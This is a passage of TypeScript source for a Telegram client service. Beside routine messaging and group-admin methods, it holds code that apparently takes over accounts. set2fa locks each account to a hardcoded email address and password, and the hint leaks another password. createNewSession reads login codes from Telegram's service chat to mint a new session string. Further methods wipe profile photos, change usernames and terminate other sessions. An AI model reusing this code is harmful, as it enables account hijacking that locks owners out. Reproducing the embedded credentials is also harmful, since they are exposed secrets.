chunks\n\n                for await (const chunk of this.client.iterDownload({\n                    file: fileLocation,\n                    offset: bigInt[0],\n                    limit: 5 * 1024 * 1024, // 80 MB limit\n                    requestSize: chunkSize,\n                })) {\n                    res.write(chunk); // Stream each chunk to the client\n                }\n                res.end();\n            } else {\n                res.status(404).send('Media not found');\n            }\n        } catch (error) {\n            if (error.message.includes('FILE_REFERENCE_EXPIRED')) {\n                return res.status(404).send('File reference expired');\n            }\n            console.error('Error downloading media:', error);\n            res.status(500).send('Error downloading media');\n        }\n    }\n\n    private async downloadWithTimeout<T>(promise: Promise<T>, timeout: number): Promise<T> {\n        return Promise.race([\n            promise,\n            new Promise<T>((_, reject) =>\n                setTimeout(() => reject(new Error('Download timeout')), timeout)\n            )\n        ]);\n    }\n\n    private getMediaDetails(media: Api.MessageMediaDocument) {\n        if (!media?.document) return null;\n\n        const doc = media.document;\n        if (doc instanceof Api.DocumentEmpty) return null;\n        const videoAttr = doc.attributes.find(attr =>\n            attr instanceof Api.DocumentAttributeVideo\n        ) as Api.DocumentAttributeVideo;\n\n        const fileNameAttr = doc.attributes.find(attr =>\n            attr instanceof Api.DocumentAttributeFilename\n        ) as Api.DocumentAttributeFilename;\n\n        return {\n            size: doc.size,\n            mimeType: doc.mimeType,\n            fileName: fileNameAttr?.fileName || null,\n            duration: videoAttr?.duration || null,\n            width: videoAttr?.w || null,\n            height: videoAttr?.h || null\n        };\n    }\n\n    private async downloadFileFromUrl(url: string): Promise<Buffer> {\n        try {\n            const response = await axios.get(url, {\n                responseType: 'arraybuffer',\n                timeout: 30000\n            });\n            return Buffer.from(response.data);\n        } catch (error) {\n            throw new Error(`Failed to download file: ${error.message}`);\n        }\n    }\n\n    async forwardMessage(toChatId: string, fromChatId: string, messageId: number) {\n        try {\n            await this.client.forwardMessages(toChatId, { fromPeer: fromChatId, messages: messageId })\n        } catch (error) {\n            console.log(\"Failed to Forward Message : \", error.errorMessage);\n        }\n    }\n\n    async updateUsername(baseUsername) {\n        let newUserName = ''\n        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';\n        let increment = 0;\n        if (username === '') {\n            try {\n                await this.client.invoke(new Api.account.UpdateUsername({ username }));\n                console.log(`Removed Username successfully.`);\n            } catch (error) {\n                console.log(error)\n            }\n        } else {\n            while (increment < 10) {\n                try {\n                    const result = await this.client.invoke(\n                        new Api.account.CheckUsername({ username })\n                    );\n                    console.log(result, \" - \", username)\n                    if (result) {\n                        await this.client.invoke(new Api.account.UpdateUsername({ username }));\n                        console.log(`Username '${username}' updated successfully.`);\n                        newUserName = username\n                        break;\n                    } else {\n                        username = baseUsername + increment;\n                        increment++;\n                        await sleep(2000);\n                    }\n                } catch (error) {\n                    console.log(error.message)\n                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {\n                        newUserName = username;\n                        break;\n                    }\n                    username = baseUsername + increment;\n                    increment++;\n                    await sleep(2000);\n                }\n            }\n        }\n        return newUserName;\n    }\n\n    async updatePrivacy() {\n        try {\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneCall(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Calls Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyProfilePhoto(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"PP Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyForwards(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n            console.log(\"forwards Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyPhoneNumber(),\n                    rules: [\n                        new Api.InputPrivacyValueDisallowAll()\n                    ],\n                })\n            );\n            console.log(\"Number Updated\")\n\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyStatusTimestamp(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll(),\n                    ],\n                })\n            );\n            console.log(\"LAstSeen Updated\")\n            await this.client.invoke(\n                new Api.account.SetPrivacy({\n                    key: new Api.InputPrivacyKeyAbout(),\n                    rules: [\n                        new Api.InputPrivacyValueAllowAll()\n                    ],\n                })\n            );\n        }\n        catch (e) {\n            throw e\n        }\n    }\n\n    async sendViewOnceMedia(chatId: string, buffer: Buffer, caption = '', isVideo?: boolean, filename?: string): Promise<Api.TypeUpdates> {\n        if (!this.client) throw new Error('Client is not initialized');\n\n        try {\n            const actualFilename = filename || `viewonce_${Date.now()}.${isVideo ? 'mp4' : 'jpg'}`;\n            const mimeType = isVideo ? 'video/mp4' : 'image/jpeg';\n            const inputFile = await this.client.uploadFile({\n                file: new CustomFile(actualFilename, buffer.length, actualFilename, buffer),\n                workers: 1\n            });\n            const result = await this.client.invoke(new Api.messages.SendMedia({\n                peer: chatId,\n                media: isVideo\n                    ? new Api.InputMediaUploadedDocument({\n                        file: inputFile,\n                        mimeType,\n                        attributes: [\n                            new Api.DocumentAttributeVideo({\n                                supportsStreaming: true,\n                                duration: 0,\n                                w: 0,\n                                h: 0\n                            })\n                        ],\n                        ttlSeconds: 10\n                    })\n                    : new Api.InputMediaUploadedPhoto({\n                        file: inputFile,\n                        ttlSeconds: 10\n                    }),\n                message: caption,\n                randomId: bigInt(Math.floor(Math.random() * 1000000000))\n            }));\n\n            console.log(`Sent view-once ${isVideo ? 'video' : 'photo'} to chat ${chatId}`);\n            return result;\n        } catch (error) {\n            console.error('Error sending view-once media:', error);\n            throw error;\n        }\n    }\n\n\n    async getFileUrl(url: string, filename: string): Promise<string> {\n        const response = await axios.get(url, { responseType: 'stream' });\n        const filePath = `/tmp/${filename}`;\n        await new Promise((resolve, reject) => {\n            const writer = fs.createWriteStream(filePath);\n            response.data.pipe(writer);\n            writer.on('finish', () => resolve(true));\n            writer.on('error', reject);\n        });\n        return filePath;\n    }\n\n    async updateProfilePic(image) {\n        try {\n            const file = await this.client.uploadFile({\n                file: new CustomFile(\n                    'pic.jpg',\n                    fs.statSync(\n                        image\n                    ).size,\n                    image\n                ),\n                workers: 1,\n            });\n            console.log(\"file uploaded\")\n            await this.client.invoke(new Api.photos.UploadProfilePhoto({\n                file: file,\n            }));\n            console.log(\"profile pic updated\")\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async hasPassword() {\n        const passwordInfo = await this.client.invoke(new Api.account.GetPassword());\n        return passwordInfo.hasPassword\n    }\n\n    async set2fa() {\n        if (!(await this.hasPassword())) {\n            console.log(\"Password Does not exist, Setting 2FA\");\n\n            const imapService = MailReader.getInstance();\n            const twoFaDetails = {\n                email: \"storeslaksmi@gmail.com\",\n                hint: \"password - India143\",\n                newPassword: \"Ajtdmwajt1@\",\n            };\n\n            try {\n                await imapService.connectToMail();\n                const checkMailInterval = setInterval(async () => {\n                    console.log(\"Checking if mail is ready\");\n\n                    if (imapService.isMailReady()) {\n                        clearInterval(checkMailInterval);\n                        console.log(\"Mail is ready, checking code!\");\n                        await this.client.updateTwoFaSettings({\n                            isCheckPassword: false,\n                            email: twoFaDetails.email,\n                            hint: twoFaDetails.hint,\n                            newPassword: twoFaDetails.newPassword,\n                            emailCodeCallback: async (length) => {\n                                console.log(\"Code sent\");\n                                return new Promise(async (resolve, reject) => {\n                                    let retry = 0;\n                                    const codeInterval = setInterval(async () => {\n                                        try {\n                                            console.log(\"Checking code\");\n                                            retry++;\n                                            if (imapService.isMailReady() && retry < 4) {\n                                                const code = await imapService.getCode();\n                                                console.log('Code:', code);\n                                                if (code) {\n                                                    await imapService.disconnectFromMail();\n                                                    clearInterval(codeInterval);\n                                                    resolve(code);\n                                                }\n                                            } else {\n                                                clearInterval(codeInterval);\n                                                await imapService.disconnectFromMail();\n                                                reject(new Error(\"Failed to retrieve code\"));\n                                            }\n                                        } catch (error) {\n                                            clearInterval(codeInterval);\n                                            await imapService.disconnectFromMail();\n                                            reject(error);\n                                        }\n                                    }, 10000);\n                                });\n                            },\n                            onEmailCodeError: (e) => {\n                                console.error('Email code error:', parseError(e));\n                                return Promise.resolve(\"error\");\n                            }\n                        });\n\n                        return twoFaDetails;\n                    } else {\n                        console.log(\"Mail not ready yet\");\n                    }\n                }, 5000);\n            } catch (e) {\n                console.error(\"Unable to connect to mail server:\", parseError(e));\n            }\n        } else {\n            console.log(\"Password already exists\");\n        }\n    }\n\n\n    async sendPhotoChat(id: string, url: string, caption: string, filename: string): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const filePath = await this.getFileUrl(url, filename);\n        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);\n        await this.client.sendFile(id, { file, caption });\n    }\n\n    async sendFileChat(id: string, url: string, caption: string, filename: string): Promise<void> {\n        if (!this.client) throw new Error('Client is not initialized');\n        const filePath = await this.getFileUrl(url, filename);\n        const file = new CustomFile(filePath, fs.statSync(filePath).size, filename);\n        await this.client.sendFile(id, { file, caption });\n    }\n\n    async deleteProfilePhotos() {\n        try {\n            const result = await this.client.invoke(\n                new Api.photos.GetUserPhotos({\n                    userId: \"me\"\n                })\n            );\n            console.log(`Profile Pics found: ${result.photos.length}`)\n            if (result && result.photos?.length > 0) {\n                const res = await this.client.invoke(\n                    new Api.photos.DeletePhotos({\n                        id: <Api.TypeInputPhoto[]><unknown>result.photos\n                    }))\n            }\n            console.log(\"Deleted profile Photos\");\n        } catch (error) {\n            throw error\n        }\n    }\n\n    async createNewSession(): Promise<string> {\n        const me = <Api.User>await this.client.getMe();\n        console.log(\"Phne:\", me.phone);\n        const newClient = new TelegramClient(new StringSession(''), parseInt(process.env.API_ID), process.env.API_HASH, {\n            connectionRetries: 1,\n        });\n        await newClient.start({\n            phoneNumber: me.phone,\n            password: async () => \"Ajtdmwajt1@\",\n            phoneCode: async () => {\n                console.log('Waiting for the OTP code from chat ID 777000...');\n                return await this.waitForOtp();\n            },\n            onError: (err: any) => { throw err },\n\n        });\n        const session = <string><unknown>newClient.session.save();\n        await newClient.disconnect();\n        // await newClient.destroy();\n        console.log(\"New Session: \", session)\n        return session\n    }\n\n    async waitForOtp() {\n        for (let i = 0; i < 3; i++) {\n            try {\n                console.log(\"Attempt : \", i)\n                const messages = await this.client.getMessages('777000', { limit: 1 });\n                const message = messages[0];\n                if (message && message.date && message.date * 1000 > Date.now() - 60000) {\n                    const code = message.text.split('.')[0].split(\"code:**\")[1].trim();\n                    console.log(\"returning: \", code);\n                    return code;\n                } else {\n                    console.log(\"Message Date: \", new Date(message.date * 1000).toISOString(), \"Now: \", new Date(Date.now() - 60000).toISOString());\n                    const code = message.text.split('.')[0].split(\"code:**\")[1].trim();\n                    console.log(\"Skipped Code: \", code);\n                    if (i == 2) {\n                        return code;\n                    }\n                    await sleep(5000)\n                }\n            } catch (err) {\n                await sleep(2000)\n                console.log(err)\n            }\n        }\n    }\n\n    async createGroupWithOptions(options: GroupOptions): Promise<Api.Chat | Api.Channel> {\n        if (!this.client) throw new Error('Client not initialized');\n        const result = await this.createGroupOrChannel(options);\n\n        // Find the channel in updates safely\n        let channelId: bigInt.BigInteger | undefined;\n        if ('updates' in result) {\n            const updates = Array.isArray(result.updates) ? result.updates : [result.updates];\n            const channelUpdate = updates.find(u => u instanceof Api.UpdateChannel);\n            if (channelUpdate && 'channelId' in channelUpdate) {\n                channelId = channelUpdate.channelId;\n            }\n        }\n\n        if (!channelId) {\n            throw new Error('Failed to create channel');\n        }\n\n        const channel = await this.client.getEntity(channelId);\n        if (!(channel instanceof Api.Channel)) {\n            throw new Error('Created entity is not a channel');\n        }\n\n        if (options.members?.length) {\n            const users = await Promise.all(\n                options.members.map(member => this.client.getInputEntity(member))\n            );\n\n            await this.client.invoke(new Api.channels.InviteToChannel({\n                channel: await this.client.getInputEntity(channel),\n                users\n            }));\n        }\n\n        if (options.photo) {\n            const buffer = await this.downloadFileFromUrl(options.photo);\n            const inputFile = await this.client.uploadFile({\n                file: new CustomFile('photo.jpg', buffer.length, 'photo.jpg', buffer),\n                workers: 1\n            });\n\n            await this.client.invoke(new Api.channels.EditPhoto({\n                channel: await this.client.getInputEntity(channel),\n                photo: new Api.InputChatUploadedPhoto({\n                    file: inputFile\n                })\n            }));\n        }\n\n        return channel;\n    }\n\n    async updateGroupSettings(settings: {\n        groupId: string;\n        title?: string;\n        description?: string;\n        slowMode?: number;\n        memberRestrictions?: any;\n        username?: string;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getEntity(settings.groupId);\n\n        if (settings.title) {\n            await this.client.invoke(new Api.channels.EditTitle({\n                channel: channel,\n                title: settings.title || ''\n            }))\n        };\n\n        if (settings.description) {\n            await this.client.invoke(new Api.messages.EditChatAbout({\n                peer: channel,\n                about: settings.description\n            }));\n        }\n\n        if (settings.username) {\n            await this.client.invoke(new Api.channels.UpdateUsername({\n                channel: channel,\n                username: settings.username\n            }));\n        }\n\n\n        if (settings.slowMode !== undefined) {\n            await this.client.invoke(new Api.channels.ToggleSlowMode({\n                channel: channel,\n                seconds: settings.slowMode\n            }));\n        }\n\n        return true;\n    }\n\n    async scheduleMessageSend(opts: MessageScheduleOptions) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const scheduleDate = Math.floor(opts.scheduledTime.getTime() / 1000);\n\n        if (opts.media) {\n            const buffer = await this.downloadFileFromUrl(opts.media.url);\n\n            const uploadedFile = await this.client.uploadFile({\n                file: new CustomFile('media', buffer.length, 'media', buffer),\n                workers: 1\n            });\n\n            return this.client.sendFile(opts.chatId, {\n                file: uploadedFile,\n                caption: opts.message,\n                forceDocument: opts.media.type === 'document',\n                scheduleDate\n            });\n        }\n\n        return this.client.sendMessage(opts.chatId, {\n            message: opts.message,\n            schedule: Math.floor(opts.scheduledTime.getTime() / 1000)\n        });\n    }\n\n    async getScheduledMessages(chatId: string): Promise<Api.TypeMessage[]> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const result = await this.client.invoke(new Api.messages.GetScheduledHistory({\n            peer: chatId,\n            hash: bigInt(0)\n        }));\n\n        return 'messages' in result && Array.isArray(result.messages)\n            ? result.messages.filter(msg => msg instanceof Api.Message)\n            : [];\n    }\n\n    async sendMediaAlbum(album: MediaAlbumOptions) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const mediaFiles = await Promise.all(\n            album.media.map(async (item) => {\n                const buffer = await this.downloadFileFromUrl(item.url);\n                const uploadedFile = await this.client.uploadFile({\n                    file: new CustomFile('media', buffer.length, 'media', buffer),\n                    workers: 1\n                });\n\n                return new Api.InputSingleMedia({\n                    media: item.type === 'photo'\n                        ? new Api.InputMediaUploadedPhoto({ file: uploadedFile })\n                        : new Api.InputMediaUploadedDocument({\n                            file: uploadedFile,\n                            mimeType: item.type === 'video' ? 'video/mp4' : 'application/octet-stream',\n                            attributes: []\n                        }),\n                    message: item.caption || '',\n                    entities: []\n                });\n            })\n        );\n\n        return this.client.invoke(new Api.messages.SendMultiMedia({\n            peer: album.chatId,\n            multiMedia: mediaFiles\n        }));\n    }\n\n    async sendMessage(params: { peer: string, parseMode?: string, message: string }) {\n        if (!this.client) throw new Error('Client not initialized');\n        const { peer, parseMode, message } = params;\n        return await this.client.sendMessage(peer, { message, parseMode });\n    }\n\n    async sendVoiceMessage(voice: {\n        chatId: string;\n        url: string;\n        duration?: number;\n        caption?: string;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const buffer = await this.downloadFileFromUrl(voice.url);\n\n        return await this.client.invoke(new Api.messages.SendMedia({\n            peer: voice.chatId,\n            media: new Api.InputMediaUploadedDocument({\n                file: await this.client.uploadFile({\n                    file: new CustomFile('voice.ogg', buffer.length, 'voice.ogg', buffer),\n                    workers: 1\n                }),\n                mimeType: 'audio/ogg',\n                attributes: [\n                    new Api.DocumentAttributeAudio({\n                        voice: true,\n                        duration: voice.duration || 0\n                    })\n                ]\n            }),\n            message: voice.caption || '',\n            randomId: bigInt(Math.floor(Math.random() * 1000000000))\n        }));\n    }\n\n    async cleanupChat(cleanup: {\n        chatId: string;\n        beforeDate?: Date;\n        onlyMedia?: boolean;\n        excludePinned?: boolean;\n        revoke?: boolean;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n        cleanup.revoke = cleanup.revoke !== undefined ? cleanup.revoke : true;\n\n        const messages = await this.client.getMessages(cleanup.chatId, {\n            limit: 100,\n            ...(cleanup.beforeDate && {\n                offsetDate: Math.floor(cleanup.beforeDate.getTime() / 1000)\n            })\n        });\n\n        const toDelete = messages.filter(msg => {\n            if (cleanup.excludePinned && msg.pinned) return false;\n            if (cleanup.onlyMedia && !msg.media) return false;\n            return true;\n        });\n\n        if (toDelete.length > 0) {\n            await this.client.deleteMessages(cleanup.chatId, toDelete.map(m => m.id), {\n                revoke: cleanup.revoke\n            })\n        }\n\n        return { deletedCount: toDelete.length };\n    }\n\n    async updatePrivacyBatch(settings: {\n        phoneNumber?: 'everybody' | 'contacts' | 'nobody';\n        lastSeen?: 'everybody' | 'contacts' | 'nobody';\n        profilePhotos?: 'everybody' | 'contacts' | 'nobody';\n        forwards?: 'everybody' | 'contacts' | 'nobody';\n        calls?: 'everybody' | 'contacts' | 'nobody';\n        groups?: 'everybody' | 'contacts' | 'nobody';\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const privacyRules = {\n            everybody: [new Api.InputPrivacyValueAllowAll()],\n            contacts: [new Api.InputPrivacyValueAllowContacts()],\n            nobody: [new Api.InputPrivacyValueDisallowAll()]\n        };\n\n        const updates = [];\n\n        const privacyMap = {\n            phoneNumber: Api.InputPrivacyKeyPhoneNumber,\n            lastSeen: Api.InputPrivacyKeyStatusTimestamp,\n            profilePhotos: Api.InputPrivacyKeyProfilePhoto,\n            forwards: Api.InputPrivacyKeyForwards,\n            calls: Api.InputPrivacyKeyPhoneCall,\n            groups: Api.InputPrivacyKeyChatInvite\n        };\n\n        for (const [key, value] of Object.entries(settings)) {\n            if (value && key in privacyMap) {\n                updates.push(this.client.invoke(new Api.account.SetPrivacy({\n                    key: new privacyMap[key](),\n                    rules: privacyRules[value]\n                })));\n            }\n        }\n\n        await Promise.all(updates);\n        return true;\n    }\n\n    async getSessionInfo() {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const [authorizationsResult, devicesResult] = await Promise.all([\n            this.client.invoke(new Api.account.GetAuthorizations()),\n            this.client.invoke(new Api.account.GetWebAuthorizations())\n        ]);\n\n        const sessions = authorizationsResult.authorizations.map(auth => ({\n            hash: auth.hash.toString(),\n            deviceModel: auth.deviceModel,\n            platform: auth.platform,\n            systemVersion: auth.systemVersion,\n            appName: auth.appName,\n            dateCreated: new Date(auth.dateCreated * 1000),\n            dateActive: new Date(auth.dateActive * 1000),\n            ip: auth.ip,\n            country: auth.country,\n            region: auth.region\n        }));\n\n        const webSessions = devicesResult.authorizations.map(auth => ({\n            hash: auth.hash.toString(),\n            domain: auth.domain,\n            browser: auth.browser,\n            platform: auth.platform,\n            dateCreated: new Date(auth.dateCreated * 1000),\n            dateActive: new Date(auth.dateActive * 1000),\n            ip: auth.ip,\n            region: auth.region\n        }));\n\n        return {\n            sessions,\n            webSessions\n        };\n    }\n\n    async terminateSession(options: {\n        hash: string;\n        type: 'app' | 'web';\n        exceptCurrent?: boolean;\n    }) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        if (options.exceptCurrent) {\n            if (options.type === 'app') {\n                await this.client.invoke(new Api.auth.ResetAuthorizations());\n            } else {\n                await this.client.invoke(new Api.account.ResetWebAuthorizations());\n            }\n            return true;\n        }\n\n        if (options.type === 'app') {\n            await this.client.invoke(new Api.account.ResetAuthorization({\n                hash: bigInt(options.hash)\n            }));\n        } else {\n            await this.client.invoke(new Api.account.ResetWebAuthorization({\n                hash: bigInt(options.hash)\n            }));\n        }\n        return true;\n    }\n\n    async getChatStatistics(chatId: string, period: 'day' | 'week' | 'month') {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const now = Math.floor(Date.now() / 1000);\n        const periodInSeconds = {\n            day: 24 * 60 * 60,\n            week: 7 * 24 * 60 * 60,\n            month: 30 * 24 * 60 * 60\n        }[period];\n\n        const messages = await this.client.getMessages(chatId, {\n            limit: 100,\n            offsetDate: now - periodInSeconds\n        });\n\n        const stats = {\n            period,\n            totalMessages: messages.length,\n            uniqueSenders: new Set(messages.map(m => m.fromId?.toString()).filter(Boolean)).size,\n            messageTypes: {\n                text: messages.filter(m => !m.media && m.message).length,\n                photo: messages.filter(m => m.media && m.media.className === 'MessageMediaPhoto').length,\n                video: messages.filter(m => {\n                    if (!m.media || m.media.className !== 'MessageMediaDocument') return false;\n                    const doc = m.media.document;\n                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('video/');\n                }).length,\n                voice: messages.filter(m => {\n                    if (!m.media || m.media.className !== 'MessageMediaDocument') return false;\n                    const doc = m.media.document;\n                    return doc && 'mimeType' in doc && doc.mimeType?.startsWith('audio/');\n                }).length,\n                other: messages.filter(m => m.media && !['MessageMediaPhoto', 'MessageMediaDocument'].includes(m.media.className)).length\n            },\n            topSenders: Object.entries(\n                messages.reduce((acc, msg) => {\n                    const senderId = msg.fromId?.toString();\n                    if (senderId) {\n                        acc[senderId] = (acc[senderId] || 0) + 1;\n                    }\n                    return acc;\n                }, {} as Record<string, number>)\n            )\n                .sort(([, a], [, b]) => b - a)\n                .slice(0, 10)\n                .map(([id, count]) => ({ id, count })),\n            mostActiveHours: Object.entries(\n                messages.reduce((acc, msg) => {\n                    const hour = new Date(msg.date * 1000).getHours();\n                    acc[hour] = (acc[hour] || 0) + 1;\n                    return acc;\n                }, {} as Record<number, number>)\n            )\n                .sort(([, a], [, b]) => b - a)\n                .map(([hour, count]) => ({ hour: Number(hour), count }))\n        };\n\n        return stats;\n    }\n\n    private getMediaExtension(media: any): string {\n        if (!media) return 'bin';\n\n        switch (media.className) {\n            case 'MessageMediaPhoto':\n                return 'jpg';\n            case 'MessageMediaDocument':\n                const doc = media.document;\n                if (!doc || !('mimeType' in doc)) return 'bin';\n\n                const mime = doc.mimeType;\n                if (mime?.startsWith('video/')) return 'mp4';\n                if (mime?.startsWith('image/')) return mime.split('/')[1];\n                if (mime?.startsWith('audio/')) return 'ogg';\n                return 'bin';\n            default:\n                return 'bin';\n        }\n    }\n\n    async setContentFilters(filters: ContentFilter) {\n        if (!this.client) throw new Error('Client not initialized');\n\n        this.contentFilters.set(filters.chatId, filters);\n\n        if (!this.filterHandler) {\n            this.filterHandler = this.client.addEventHandler(async (event) => {\n                if (event instanceof NewMessageEvent) {\n                    const message = event.message;\n                    const chatId = message.chatId?.toString();\n                    const filter = this.contentFilters.get(chatId);\n\n                    if (!filter) return;\n\n                    const shouldFilter = await this.evaluateMessage(message, filter);\n                    if (shouldFilter) {\n                        for (const action of filter.actions) {\n                            await this.executeFilterAction(action, message);\n                        }\n                    }\n                }\n            }, new NewMessage({}));\n        }\n    }\n\n    private async evaluateMessage(message: Api.Message, filter: ContentFilter): Promise<boolean> {\n        if (filter.keywords?.length) {\n            const messageText = message.message.toLowerCase();\n            if (filter.keywords.some(keyword => messageText.includes(keyword.toLowerCase()))) {\n                return true;\n            }\n        }\n\n        if (filter.mediaTypes?.length && message.media) {\n            const mediaType = this.getMediaType(message.media);\n            if (filter.mediaTypes.includes(mediaType)) {\n                return true;\n            }\n        }\n\n        return false;\n    }\n\n    private async executeFilterAction(action: 'delete' | 'warn' | 'mute', message: Api.Message) {\n        try {\n            switch (action) {\n                case 'delete':\n                    await this.client.deleteMessages(message.chatId, [message.id], { revoke: true });\n                    break;\n                case 'warn':\n                    await this.client.sendMessage(message.chatId, {\n                        message: ` Message filtered due to content policy.`,\n                        replyTo: message.id\n                    });\n                    break;\n                case 'mute':\n                    if (message.fromId) {\n                        await this.client.invoke(new Api.channels.EditBanned({\n                            channel: message.chatId,\n                            participant: message.fromId,\n                            bannedRights: new Api.ChatBannedRights({\n                                untilDate: Math.floor(Date.now() / 1000) + 3600,\n                                sendMessages: true\n                            })\n                        }));\n                    }\n                    break;\n            }\n        } catch (error) {\n            console.error(`Failed to execute filter action ${action}:`, error);\n        }\n    }\n\n    private getSearchFilter(filter: string): Api.TypeMessagesFilter {\n        switch (filter) {\n            case 'photo': return new Api.InputMessagesFilterPhotos();\n            case 'video': return new Api.InputMessagesFilterVideo();\n            case 'document': return new Api.InputMessagesFilterDocument();\n            case 'url': return new Api.InputMessagesFilterUrl();\n            case 'roundVideo': return new Api.InputMessagesFilterRoundVideo();\n            case 'phtotoVideo': return new Api.InputMessagesFilterPhotoVideo();\n            case 'voice': return new Api.InputMessagesFilterVoice();\n            case 'roundVoice': return new Api.InputMessagesFilterRoundVoice();\n            case 'gif': return new Api.InputMessagesFilterGif();\n            case 'sticker': return new Api.InputMessagesFilterDocument();\n            case 'animation': return new Api.InputMessagesFilterDocument();\n            case 'music': return new Api.InputMessagesFilterMusic();\n            case 'chatPhoto': return new Api.InputMessagesFilterChatPhotos();\n            case 'location': return new Api.InputMessagesFilterGeo();\n            case 'contact': return new Api.InputMessagesFilterContacts();\n            case 'chatPhoto': return new Api.InputMessagesFilterChatPhotos();\n            case 'phoneCalls': return new Api.InputMessagesFilterPhoneCalls({ missed: false });\n            default: return new Api.InputMessagesFilterEmpty();\n        }\n    }\n\n    private getMediaType(media: Api.TypeMessageMedia): 'photo' | 'video' | 'document' {\n        if (media instanceof Api.MessageMediaPhoto) {\n            return 'photo';\n        } else if (media instanceof Api.MessageMediaDocument) {\n            const document = media.document as Api.Document;\n            if (document.attributes.some(attr => attr instanceof Api.DocumentAttributeVideo)) {\n                return 'video';\n            }\n            return 'document';\n        }\n        return 'document';\n    }\n\n    private getEntityId(entity: Api.TypeInputPeer | Api.TypeUser | Api.TypeChat): string {\n        if (entity instanceof Api.User) return entity.id.toString();\n        if (entity instanceof Api.Channel) return entity.id.toString();\n        if (entity instanceof Api.Chat) return entity.id.toString();\n        return '';\n    }\n\n    async addGroupMembers(groupId: string, members: string[]): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        const users = await Promise.all(\n            members.map(member => this.client.getInputEntity(member))\n        );\n\n        await this.client.invoke(new Api.channels.InviteToChannel({\n            channel: channel,\n            users\n        }));\n    }\n\n    async removeGroupMembers(groupId: string, members: string[]): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        for (const member of members) {\n            const user = await this.client.getInputEntity(member);\n            await this.client.invoke(new Api.channels.EditBanned({\n                channel: channel,\n                participant: user,\n                bannedRights: new Api.ChatBannedRights({\n                    untilDate: 0,\n                    viewMessages: true,\n                    sendMessages: true,\n                    sendMedia: true,\n                    sendStickers: true,\n                    sendGifs: true,\n                    sendGames: true,\n                    sendInline: true,\n                    embedLinks: true\n                })\n            }));\n        }\n    }\n\n    async promoteToAdmin(\n        groupId: string,\n        userId: string,\n        permissions?: {\n            changeInfo?: boolean;\n            postMessages?: boolean;\n            editMessages?: boolean;\n            deleteMessages?: boolean;\n            banUsers?: boolean;\n            inviteUsers?: boolean;\n            pinMessages?: boolean;\n            addAdmins?: boolean;\n            anonymous?: boolean;\n            manageCall?: boolean;\n        },\n        rank?: string\n    ): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        const user = await this.client.getInputEntity(userId);\n\n        await this.client.invoke(new Api.channels.EditAdmin({\n            channel: channel,\n            userId: user,\n            adminRights: new Api.ChatAdminRights({\n                changeInfo: permissions?.changeInfo ?? false,\n                postMessages: permissions?.postMessages ?? false,\n                editMessages: permissions?.editMessages ?? false,\n                deleteMessages: permissions?.deleteMessages ?? false,\n                banUsers: permissions?.banUsers ?? false,\n                inviteUsers: permissions?.inviteUsers ?? true,\n                pinMessages: permissions?.pinMessages ?? false,\n                addAdmins: permissions?.addAdmins ?? false,\n                anonymous: permissions?.anonymous ?? false,\n                manageCall: permissions?.manageCall ?? false,\n                other: false\n            }),\n            rank: rank || ''\n        }));\n    }\n\n    async demoteAdmin(groupId: string, userId: string): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        const user = await this.client.getInputEntity(userId);\n\n        await this.client.invoke(new Api.channels.EditAdmin({\n            channel: channel,\n            userId: user,\n            adminRights: new Api.ChatAdminRights({\n                changeInfo: false,\n                postMessages: false,\n                editMessages: false,\n                deleteMessages: false,\n                banUsers: false,\n                inviteUsers: false,\n                pinMessages: false,\n                addAdmins: false,\n                anonymous: false,\n                manageCall: false,\n                other: false\n            }),\n            rank: ''\n        }));\n    }\n\n    async unblockGroupUser(groupId: string, userId: string): Promise<void> {\n        if (!this.client) throw new Error('Client not initialized');\n\n        const channel = await this.client.getInputEntity(groupId);\n        const user = await this.client.getInputEntity(userId);\n\n        await this.client.invoke(new Api.channels.EditBanned({\n            channel: channel,\n            participant: user,\n            bannedRights: new Api.ChatBannedRights({\n                untilDate: 0,\n                viewMessages: false,\n                sendMessages: false,\n                sendMedia: false,\n                sendStickers: false,\n                sendGifs: false,\n                sendGames: false,\n                sendInline: false,\n                embedLinks: false\n            })\n        }));\n    }\n\n    async getGroupAdmins(groupId: string): Promise<Array<{\n        userId: string;\n        rank?: string;\n        permissions: {\n            changeInfo: boolean;\n            postMessages: boolean;\n            editMessages: boolean;\n            deleteMessages: boolean;\n            banUsers: boolean;\n            inviteUsers: boolean;\n            pinMessages: boolean;\n            addAdmins: boolean;\n            anonymous: boolean;\n            manageCall: boolean;\n        };\n    }>> {\n        if (!this.client) throw 